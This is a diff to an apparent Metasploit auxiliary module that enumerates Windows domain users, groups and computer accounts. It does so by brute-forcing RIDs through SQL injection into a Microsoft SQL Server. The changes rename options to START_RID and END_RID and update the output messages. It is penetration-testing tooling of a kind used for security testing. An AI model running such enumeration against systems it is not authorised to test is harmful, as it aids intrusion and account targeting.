@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/exploit/mssql_commands'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
@@ -33,56 +31,58 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
     [
-      OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 3000])
-    ], self.class)
+      OptInt.new('START_RID', [true, 'RID to start fuzzing at.', 500]),
+      OptInt.new('END_RID', [true, 'RID to stop fuzzing at.', 3000])
+    ])
   end
 
   def run
-    print_status("#{peer} - Grabbing the server and domain name...")
+    print_status("Grabbing the SQL Server name and domain...")
     db_server_name = get_server_name
     if db_server_name.nil?
-      print_error("#{peer} - Unable to grab the server name")
+      print_error("Unable to grab the server name")
       return
     else
-      print_good("#{peer} - Server name: #{db_server_name}")
+      print_good("Server name: #{db_server_name}")
     end
 
     db_domain_name = get_domain_name
     if db_domain_name.nil?
-      print_error("#{peer} - Unable to grab domain name")
+      print_error("Unable to grab domain name")
       return
     end
 
     # Check if server is on a domain
     if db_server_name == db_domain_name
-      print_error("#{peer} - The SQL Server does not appear to be part of a Windows domain")
+      print_error("The SQL Server does not appear to be part of a Windows domain")
       return
     else
-      print_good("#{peer} - Domain name: #{db_domain_name}")
+      print_good("Domain name: #{db_domain_name}")
     end
 
-    print_status("#{peer} - Grabbing the SID for the domain...")
+    print_status("Grabbing the SID for the domain...")
     windows_domain_sid = get_windows_domain_sid(db_domain_name)
     if windows_domain_sid.nil?
-      print_error("#{peer} - Could not recover the SQL Server's domain sid.")
+      print_error("Could not recover the SQL Server's domain sid.")
       return
     else
-      print_good("#{peer} - Domain sid: #{windows_domain_sid}")
+      print_good("Domain sid: #{windows_domain_sid}")
     end
 
     # Get a list of windows users, groups, and computer accounts using SUSER_NAME()
-    print_status("#{peer} - Brute forcing #{datastore['FuzzNum']} RIDs through the SQL Server, be patient...")
+    total_rids = datastore['END_RID'] - datastore['START_RID']
+    print_status("Brute forcing #{total_rids} RIDs via SQL injection, be patient...")
     domain_users = get_win_domain_users(windows_domain_sid)
     if domain_users.nil?
-      print_error("#{peer} - Sorry, no Windows domain accounts were found, or DC could not be contacted.")
+      print_error("Sorry, no Windows domain accounts were found, or DC could not be contacted.")
       return
     end
 
     # Print number of objects found and write to a file
-    print_good("#{peer} - #{domain_users.length} user accounts, groups, and computer accounts were found.")
+    print_good("#{domain_users.length} user accounts, groups, and computer accounts were found.")
 
     # Create table for report
-    windows_domain_login_table = Rex::Ui::Text::Table.new(
+    windows_domain_login_table = Rex::Text::Table.new(
       'Header'  => 'Windows Domain Accounts',
       'Ident'   => 1,
       'Columns' => ['name']
@@ -172,11 +172,12 @@ class Metasploit3 < Msf::Auxiliary
 
     windows_logins = []
 
+    total_rids = datastore['END_RID'] - datastore['START_RID']
     # Fuzz the principal_id parameter (RID in this case) passed to the SUSER_NAME function
-    (500..datastore['FuzzNum']).each do |principal_id|
-
+    (datastore['START_RID']..datastore['END_RID']).each do |principal_id|
+      rid_diff = principal_id - datastore['START_RID']
       if principal_id % 100 == 0
-        print_status("#{peer} - Querying SID #{principal_id} of #{datastore['FuzzNum']}")
+        print_status("#{rid_diff} of #{total_rids } RID queries complete")
       end
 
        user_sid = build_user_sid(domain_sid, principal_id)
@@ -195,7 +196,7 @@ class Metasploit3 < Msf::Auxiliary
 
         unless windows_login.empty? || windows_logins.include?(windows_login)
           windows_logins.push(windows_login)
-          print_good("#{peer} -  #{windows_login}")
+          print_good(" #{windows_login}")
         end
       end
 
@@ -215,5 +216,4 @@ class Metasploit3 < Msf::Auxiliary
     # Create full sid
     "0x#{domain_sid}#{principal_id}"
   end
-
 end
